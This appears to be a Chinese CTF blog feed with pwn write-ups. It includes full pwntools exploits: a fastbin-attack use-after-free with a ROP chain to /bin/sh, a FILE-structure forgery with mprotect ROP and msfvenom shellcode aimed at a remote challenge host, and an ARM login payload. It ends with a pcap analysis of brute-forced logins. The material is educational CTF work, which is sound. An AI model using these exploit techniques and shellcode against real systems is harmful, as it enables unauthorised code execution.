<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> base64</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">p = process(<span class="string">'./login'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">'\x61\x86\x18\x61\x86\x18\x61\x86\x18\x61\x86\x18\x61\x86\x18\x61\x86\x18\x61\x86\x18\x61\x86\x18\x5d'</span></div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'Code\n\n'</span>)</div><div class="line">p.sendline(payload)</div><div class="line">raw_input()</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ARM </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[fastbin attack 利用]]></title>
      <url>/2017/04/06/fastbin-attack/</url>
      <content type="html"><![CDATA[<p>这也算是给自己补补堆溢出的姿势吧。</p>
<p>题目是一题来自bctf二月场的fastbin attack 非常经典的一题教学题，当时由于知识点没有get到，所以没做出来，一直放桌面，最近闲太碍眼了，开始日。</p>
<p>首先补一波fast bin attack的姿势，参考自freebuf:<a href="http://www.freebuf.com/news/88660.html" target="_blank" rel="external">http://www.freebuf.com/news/88660.html</a></p>
<p>基本上看着这个就能做出题目了。</p>
<p>这题题目涉及到了两个考点1、UAF姿势 2、fastbin attack 的姿势</p>
<p>注意点是，malloc fastbin 会检测长度，如果长度不符合就会报错，就像下面这样。<br><img src="/2017/04/06/fastbin-attack/1.png" alt="1.png" title=""><br>所以需要使待malloc的fast chunk内的size符合要求。。（BTW chunk结构不多说了，自己去百度）这一般情况下需要自己去构造，不过这题例外，题目给出了利用点，即地址为0x6C4Aa0 ，所以说教学题。。很经典。。。</p>
<p>接着我们就可以任意地址写啦~~,不过我们的目的是要拿到shell，这题是静态编译的，所以我们可以考虑下用ropchain来拿shell</p>
<p>需要用rop的话，栈内的数据必须是我们可控的，目前手里有个任意地址写的漏洞，但是我们不知道栈的地址，所以我们接下去要做的就是拿到栈地址，需要有个函数来泄露栈地址。这边将free_hook修改成printf函数的地址，在调用free的时候会跳转到printf执行。泄露栈地址之后，将我们的rop写入栈，并执行。exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-06 07:15:19</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(<span class="string">'./fast-fast-fast'</span>)</div><div class="line">	gdb.attach(p,<span class="string">"b*0x40141B\nc"</span>)</div><div class="line"><span class="comment"># else:</span></div><div class="line"><span class="comment"># 	p = remote()</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">	p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">	p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line">	<span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_fast</span><span class="params">(data)</span>:</span></div><div class="line">	ru(<span class="string">"saysecret\n"</span>)</div><div class="line">	sl(<span class="string">"1"</span>)</div><div class="line">	ru(<span class="string">"delet\n"</span>)</div><div class="line">	sl(<span class="string">'1'</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_fast</span><span class="params">(data)</span>:</span></div><div class="line">	ru(<span class="string">"saysecret\n"</span>)</div><div class="line">	sl(<span class="string">"1"</span>)</div><div class="line">	ru(<span class="string">"delet\n"</span>)</div><div class="line">	sl(<span class="string">'2'</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_fast</span><span class="params">()</span>:</span></div><div class="line">	ru(<span class="string">"saysecret\n"</span>)</div><div class="line">	sl(<span class="string">"1"</span>)</div><div class="line">	ru(<span class="string">"delet\n"</span>)</div><div class="line">	sl(<span class="string">'3'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_small</span><span class="params">(data)</span>:</span></div><div class="line">	ru(<span class="string">"saysecret\n"</span>)</div><div class="line">	sl(<span class="string">"2"</span>)</div><div class="line">	ru(<span class="string">"delet\n"</span>)</div><div class="line">	sl(<span class="string">'1'</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_small</span><span class="params">(data)</span>:</span></div><div class="line">	ru(<span class="string">"saysecret\n"</span>)</div><div class="line">	sl(<span class="string">"2"</span>)</div><div class="line">	ru(<span class="string">"delet\n"</span>)</div><div class="line">	sl(<span class="string">'2'</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_small</span><span class="params">()</span>:</span></div><div class="line">	ru(<span class="string">"saysecret\n"</span>)</div><div class="line">	sl(<span class="string">"2"</span>)</div><div class="line">	ru(<span class="string">"delet\n"</span>)</div><div class="line">	sl(<span class="string">'3'</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">()</span>:</span></div><div class="line">	ru(<span class="string">"saysecret\n"</span>)</div><div class="line">	sl(<span class="string">"3"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(addr,data)</span>:</span></div><div class="line">	edit_fast(p64(<span class="number">1</span>)+p64(<span class="number">0xFB0</span>)+p64(addr))<span class="comment">#change small chunk</span></div><div class="line">	edit_small(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getchain</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">from</span> struct <span class="keyword">import</span> pack</div><div class="line">	p = <span class="string">''</span></div><div class="line"></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000401b97</span>) <span class="comment"># pop rsi ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006c1060</span>) <span class="comment"># @ .data</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000044d8e4</span>) <span class="comment"># pop rax ; ret</span></div><div class="line">	p += <span class="string">'/bin//sh'</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004714a1</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000401b97</span>) <span class="comment"># pop rsi ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006c1068</span>) <span class="comment"># @ .data + 8</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000041c3cf</span>) <span class="comment"># xor rax, rax ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004714a1</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000401a83</span>) <span class="comment"># pop rdi ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006c1060</span>) <span class="comment"># @ .data</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000401b97</span>) <span class="comment"># pop rsi ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006c1068</span>) <span class="comment"># @ .data + 8</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000437835</span>) <span class="comment"># pop rdx ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006c1068</span>) <span class="comment"># @ .data + 8</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000041c3cf</span>) <span class="comment"># xor rax, rax ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464e75</span>) <span class="comment"># syscall ; ret</span></div><div class="line">	<span class="keyword">return</span> p</div><div class="line">create_fast(<span class="string">"aaa"</span>)</div><div class="line">del_fast()</div><div class="line">create_small(<span class="string">"aaa"</span>)</div><div class="line">del_fast()</div><div class="line">create_fast(<span class="string">"aaa"</span>)</div><div class="line">del_fast()</div><div class="line">edit_small(p64(<span class="number">0x6C4Aa0</span>))</div><div class="line">say()</div><div class="line">create_fast(p64(<span class="number">0x6C4A80</span>))</div><div class="line">edit(<span class="number">0x6C3750</span>,p64(<span class="number">0x4082A0</span>))</div><div class="line">edit(<span class="number">0x6C2710</span>,<span class="string">"%8$llX"</span>)</div><div class="line">del_small()</div><div class="line">stack_addr = int(ru(<span class="string">"\n"</span>)[:<span class="number">12</span>],<span class="number">16</span>)<span class="number">-0x18</span></div><div class="line"><span class="keyword">print</span> <span class="string">"stack_addr="</span>+hex(stack_addr)</div><div class="line">edit(stack_addr,getchain())</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap overflow </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[FILE结构体的溢出利用【FSP】]]></title>
      <url>/2017/03/17/FILE%E7%BB%93%E6%9E%84%E4%BD%93%E7%9A%84%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E3%80%90FSP%E3%80%91/</url>
      <content type="html"><![CDATA[<p>FILE用到的知识点 参考自   <a href="http://bobao.360.cn/learning/detail/3296.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3296.html</a></p>
<p>题目来源于BCTF 线上总决赛资格赛 pwn50<br>题目地址 <a href="https://github.com/Winter3un/ctf_task/tree/master/BCTF2017" target="_blank" rel="external">https://github.com/Winter3un/ctf_task/tree/master/BCTF2017</a></p>
<p>用到的一个shellcode姿势点如下:</p>
<blockquote>
<p>使用msfvenom生成payload。<br>由于我这边用的wookali，没有自带msf。<a href="https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers" target="_blank" rel="external">Download it</a><br>中文文档：<a href="http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf" target="_blank" rel="external">http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf</a></p>
<p>生成shellcode:<code>msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b &#39;\x00\x0b\x0d\x0a&#39;</code></p>
</blockquote>
<p>通过伪造FILE结构体，获得一次控制EIP的机会，同时 meun 函数存在经典栈溢出 <code>scanf(&quot;%s&quot;,&amp;v1);</code>,可以构造rop，并利用一次控制EIP的机会执行ROP，该ROP利用mprotect函数将bss段设置为可执行，并执行放置入bss区域的规避掉坏字符的shellcode。</p>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line"></div><div class="line"><span class="comment"># p = process("./fake")</span></div><div class="line">p = remote(<span class="string">'106.75.93.221'</span>,<span class="number">12345</span> )</div><div class="line"></div><div class="line">x_addr = <span class="number">0x80EF9E0</span></div><div class="line">fp_addr = <span class="number">0x80EFA00</span></div><div class="line">jump_addr = fp_addr+<span class="number">0x10</span>+<span class="number">4</span>*<span class="number">0x25</span>+<span class="number">4</span>+<span class="number">8</span></div><div class="line">eip_addr = <span class="number">0x805069d</span></div><div class="line">read_addr = <span class="number">0x8071460</span></div><div class="line">printf_addr = <span class="number">0x804F6D0</span></div><div class="line">Welcome_addr = <span class="number">0x0804889C</span></div><div class="line">menu_addr = <span class="number">0x8048AFF</span></div><div class="line">p_ret = <span class="number">0x080481d1</span></div><div class="line">ppp_ret = <span class="number">0x0804f7da</span></div><div class="line">mprotect_addr = <span class="number">0x08071FD0</span></div><div class="line">page_size = <span class="number">4096</span></div><div class="line">p.recvuntil(<span class="string">"name?\n"</span>)</div><div class="line">payload = <span class="string">"a"</span>*(fp_addr-x_addr)+p32(fp_addr+<span class="number">4</span>)</div><div class="line"><span class="comment"># IO_FILE = p32(x_addr)*0x25+p32(jump_addr)</span></div><div class="line"></div><div class="line">x=<span class="number">0x10</span></div><div class="line">IO_FILE = p32(fp_addr)*(<span class="number">0x11</span>-x)+p32(<span class="number">0</span>)*x+<span class="string">"\x00\x00"</span>+<span class="string">"\x00"</span>+<span class="string">"\x00"</span>+p32(fp_addr)*<span class="number">0x13</span>+p32(jump_addr)</div><div class="line">JUMP = p32(<span class="number">0</span>)*<span class="number">2</span>+p32(eip_addr)*<span class="number">21</span></div><div class="line">gdb.attach(p,<span class="string">"b*0x805069d\nb*0x805442A\nb*0x80534bb\nc"</span>)</div><div class="line">payload +=IO_FILE+JUMP</div><div class="line"></div><div class="line">shellcode_addr = (<span class="number">0x80EF9E0</span> + len(payload))</div><div class="line"><span class="keyword">print</span> <span class="string">"shellcode_addr="</span>+hex(shellcode_addr)</div><div class="line">exec_addr = (<span class="number">0x80EF9E0</span> + len(payload))&amp;~(page_size<span class="number">-1</span>)</div><div class="line">buf =  <span class="string">""</span></div><div class="line">buf += <span class="string">"\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line">buf += <span class="string">"\x76\x0e\x9d\x3a\x39\x8f\x83\xee\xfc\xe2\xf4\xf7\x31"</span></div><div class="line">buf += <span class="string">"\x61\x16\xcf\x5c\x51\xa2\xfe\xb3\xde\xe7\xb2\x49\x51"</span></div><div class="line">buf += <span class="string">"\x8f\xf5\x15\x5b\xe6\xf3\xb3\xda\xdd\x75\x32\x39\x8f"</span></div><div class="line">buf += <span class="string">"\x9d\x15\x5b\xe6\xf3\x15\x4a\xe7\x9d\x6d\x6a\x06\x7c"</span></div><div class="line">buf += <span class="string">"\xf7\xb9\x8f"</span></div><div class="line">shellcode = buf</div><div class="line"></div><div class="line">payload+=shellcode</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line">p.recvuntil(<span class="string">"&gt; "</span>)</div><div class="line"></div><div class="line">payload2 = p32(mprotect_addr)+p32(ppp_ret)+p32(exec_addr)+p32(page_size)+p32(<span class="number">7</span>)+p32(shellcode_addr)</div><div class="line">p.sendline(<span class="string">"3"</span>+<span class="string">"a"</span>*(<span class="number">0x3c</span><span class="number">-1</span>)+payload2)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> bctf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XDCTF2016_铁人三项_WP（HTTP数据包的快速分析）]]></title>
      <url>/2016/10/05/xdctf2016-wp/</url>
      <content type="html"><![CDATA[<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>题目如下</p>
<img src="/2016/10/05/xdctf2016-wp/title.jpg" alt="title.jpg" title="">
<p>下载数据包（光下载就用了我两天。。比赛都结束了，也是醉醉的）</p>
<p>下载完毕后发现有多个数据包，使用wireshark自带的pcap数据包合并工具将多个pcap数据包合并成为一个数据包 sum.pcap<br><img src="/2016/10/05/xdctf2016-wp/sum1.png" alt="sum1.png" title=""></p>
 <a id="more"></a>
<img src="/2016/10/05/xdctf2016-wp/sum2.png" alt="sum2.png" title="">
<p>使用wireshark打开分析，在文件-＞导出对象－＞HTTP 中发现敏感的登陆页面，并且多次出现，猜测应该是黑客爆破的登陆页面。<br><img src="/2016/10/05/xdctf2016-wp/http.png" alt="http.png" title=""></p>
<p>接着使用过滤规则<code>http and ((ip.src == 219.239.105.18 and ip.dst == 172.16.61.210) or (ip.src == 172.16.61.210 and ip.dst == 219.239.105.18))</code>，仔细分析对应的HTTP攻击流量。</p>
<p>然而wireshark还是太麻烦了。。。 做起来太耗时间，想着能否有一个工具可以提取出pcap数据包中对应的IP的HTTP协议数据包，把heard 和 body 都提出来。</p>
<p>找了一下发现一个神器<a href="https://github.com/caoqianli/httpcap#usage" target="_blank" rel="external">https://github.com/caoqianli/httpcap#usage</a></p>
<p>安装完毕后，使用其进行数据包分析，首先提取我们迫切需要的数据。</p>
<p><code>parse-pcap -i 219.239.105.18 -vvv sum.pcap &gt; 1.html</code></p>
<p>然后使用notepad++对其进行手工分析（数据量已经很少了。</p>
<p>找到关键数据,用户名为root 密码为 123456  题一、题二已经解决。</p>
